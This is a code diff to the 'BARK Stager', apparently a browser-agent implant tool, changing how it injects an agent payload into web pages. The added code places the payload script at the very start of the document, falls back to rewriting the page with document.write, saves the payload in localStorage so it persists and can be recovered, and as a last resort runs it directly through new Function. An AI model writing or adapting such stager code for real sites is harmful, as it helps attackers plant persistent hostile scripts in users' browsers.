@@ -126,23 +126,64 @@
             
             // Create script element
             const scriptElement = document.createElement('script');
+            scriptElement.id = 'bark-agent-script';
             scriptElement.type = 'text/javascript';
-            scriptElement.textContent = payload;
             
-            // Add a comment to mark this as a BARK agent script (optional)
+            // Add a comment to mark this as a BARK agent script
             scriptElement.textContent = `/* BARK Agent Payload */\n${payload}`;
             
-            // Add to DOM - preferably at the end of body for maximum compatibility
-            if (document.body) {
-                document.body.appendChild(scriptElement);
-            } else {
-                // Fallback to head if body is not available
-                document.head.appendChild(scriptElement);
+            // Try to position the script at the earliest possible position in the DOM
+            // First attempt - as first child in <html>
+            if (document.documentElement) {
+                document.documentElement.insertBefore(scriptElement, document.documentElement.firstChild);
+                console.log("[BARK Stager] Payload injected at beginning of HTML element");
+            } 
+            // Second attempt - as first child in <head>
+            else if (document.head) {
+                document.head.insertBefore(scriptElement, document.head.firstChild);
+                console.log("[BARK Stager] Payload injected at beginning of head");
+            }
+            // Last attempt - as first child in <body>
+            else if (document.body) {
+                document.body.insertBefore(scriptElement, document.body.firstChild);
+                console.log("[BARK Stager] Payload injected at beginning of body");
+            }
+            // Fallback approach using document.write
+            else {
+                const scriptText = `<script id="bark-agent-script" type="text/javascript">/* BARK Agent Payload */\n${payload}<\/script>`;
+                const htmlContent = document.documentElement.outerHTML;
+                document.open();
+                document.write(scriptText + htmlContent);
+                document.close();
+                console.log("[BARK Stager] Payload injected using document.write");
             }
             
-            console.log("[BARK Stager] Payload successfully injected");
+            // Store the agent code in localStorage for persistence/recovery
+            try {
+                localStorage.setItem('_barkAgentCode', payload);
+                console.log("[BARK Stager] Saved agent code to localStorage for persistence");
+            } catch (e) {
+                console.warn("[BARK Stager] Could not save to localStorage:", e);
+            }
+            
+            // Add a global marker to indicate the agent is present
+            window._barkAgentInjected = true;
+            
+            return true;
         } catch (error) {
             console.error("[BARK Stager] Failed to inject payload:", error);
+            
+            // Last resort - direct evaluation
+            try {
+                console.log("[BARK Stager] Attempting direct execution");
+                const dynamicFunction = new Function(payload);
+                dynamicFunction();
+                console.log("[BARK Stager] Direct execution successful");
+                return true;
+            } catch (execError) {
+                console.error("[BARK Stager] All injection methods failed:", execError);
+                return false;
+            }
         }
     };
     
